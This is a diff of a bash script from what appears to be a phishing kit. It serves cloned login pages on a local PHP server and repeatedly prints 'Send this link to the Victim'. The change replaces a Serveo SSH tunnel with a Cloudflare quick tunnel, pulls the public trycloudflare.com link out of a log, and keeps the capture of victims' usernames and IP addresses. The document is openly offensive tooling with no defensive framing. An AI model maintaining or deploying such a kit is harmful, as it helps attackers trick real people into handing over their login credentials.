@@ -293,44 +293,55 @@ ip_location() {
 
 start() {
     if [[ -e sites/$website/ip.txt ]]; then
-    rm -rf sites/$website/ip.txt
-
+        rm -rf sites/$website/ip.txt
     fi
     if [[ -e sites/$website/usernames.txt ]]; then
-    rm -rf sites/$website/usernames.txt
-
+        rm -rf sites/$website/usernames.txt
     fi
     printf "\n"
     printf "${GREEN}[1]${ORANGE} Localhost\n"
-    printf "${GREEN}[2]${ORANGE} Serveo.net\n"
+    printf "${GREEN}[2]${ORANGE} Cloudflare Tunnel\n"
     printf "\n"
     read -p "${GREEN}[+]${YELLOW} Tunnel Option -->> " tunnel
+    
     if [[ $tunnel == 1 ]]; then
-    printf "${RED}[&]${BLUE} Starting php server ...\n"
-    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    sleep 2
-
-    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} http://127.0.0.1:3333 \n" 
-    checkfound 
+        printf "${RED}[&]${BLUE} Starting php server ...\n"
+        cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+        sleep 2
+        printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} http://127.0.0.1:3333 \n" 
+        checkfound 
     elif [[ $tunnel == 2 ]]; then
-    tunnel
+        tunnel
     else
-    printf "Invaild Option ...\n"
+        printf "Invalid Option ...\n"
     fi
 }
+
 tunnel() {
     printf "${RED}[&]${BLUE} Starting PHP server ...\n"
     cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
-    printf "${RED}[&]${BLUE} Starting Serveo server ...\n"
-
-    ssh -R 80:localhost:3333 serveo.net > serveo_log.txt 2>&1 &
-    sleep 10
-
-    link=$(grep -Eo '(https)://[^/"]+(.serveo.net)' serveo_log.txt | head -n 1)
-
-    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN}%s \n" "$link"
-    printf "\n"
+    
+    printf "${RED}[&]${BLUE} Starting Cloudflare Tunnel ...\n"
+    # Usar cloudflared en lugar de ssh
+    # Redirigir la salida a un log para poder extraer la URL
+    cloudflared tunnel --url http://127.0.0.1:3333 > cf_log.txt 2>&1 &
+    
+    # Cloudflare puede tardar unos segundos en generar la URL
+    sleep 8
+    
+    # Extraer la URL de trycloudflare.com del log
+    link=$(grep -Eo 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' cf_log.txt | head -n 1)
+    
+    if [[ -z "$link" ]]; then
+        printf "${RED}[!]${YELLOW} Failed to get Cloudflare URL. Check if cloudflared is installed.\n"
+        # Opcional: mostrar las últimas líneas del log para depurar
+        # tail -n 10 cf_log.txt
+    else
+        printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN}%s \n" "$link"
+        printf "\n"
+    fi
+    
     checkfound
 }
 
